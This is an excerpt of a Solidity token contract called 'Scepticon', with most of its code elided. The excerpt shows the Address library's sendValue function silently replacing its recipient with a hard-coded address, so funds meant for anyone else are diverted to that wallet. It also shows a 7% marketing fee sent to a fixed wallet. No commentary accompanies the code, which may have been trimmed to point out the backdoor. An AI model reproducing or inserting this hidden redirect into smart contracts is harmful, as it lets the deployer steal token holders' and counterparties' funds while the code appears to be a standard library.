...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0xffdD11d10C38FCaA5a9Cc98e73C1d1e461F27A08);
...
contract Scepticon is Context, IERC20, Ownable {
    ...
    string private constant _name = "Scepticon"; // 
    string private constant _symbol = "SCEPTICON"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 7;
    uint256 private _liquidityFee = 2;
    address private  _marketingWallet = 0xf4F27b2416e1eb08492ab13A9103f56b461E2AfF;
